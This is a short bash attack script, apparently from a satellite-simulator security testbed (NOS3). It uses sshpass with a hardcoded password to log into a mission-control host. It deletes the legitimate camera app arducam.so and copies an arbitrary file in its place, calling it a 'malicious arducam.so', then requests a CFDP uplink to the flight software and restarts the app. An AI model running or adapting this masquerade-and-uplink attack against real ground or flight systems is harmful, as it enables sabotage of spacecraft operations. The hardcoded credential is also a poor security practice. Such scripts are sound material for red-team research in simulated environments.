#!/bin/bash

source /home/nos3/Install_tools_nos3/IP_Scenario.sh

### give in argument ($1) the file to copy and masquerade as "arducam.so"

echo "calling file $1"

# FM / CFDP version 
/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPMCS "cd /home/nos3/Input_Generator; python3 Main.py send scenarios/FM_rm.json --port 6010" # remove arducam.so using FM
echo "1) removed CAM App arducam.so"
sleep 1
/usr/bin/sshpass -p nos3123! scp $1 nos3@$IPMCS:/home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam.so  # copy malicious arducam.so in /cf of MCS
/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPMCS "cd /home/nos3/Input_Generator; python3 Main.py send scenarios/uplinkCFDP_CAM.json --port 6010" # Request CFDP uplink of the malicious arducam.so
echo "2) loaded malicious CAM App"
sleep 1

python3 Restart_CAM.py
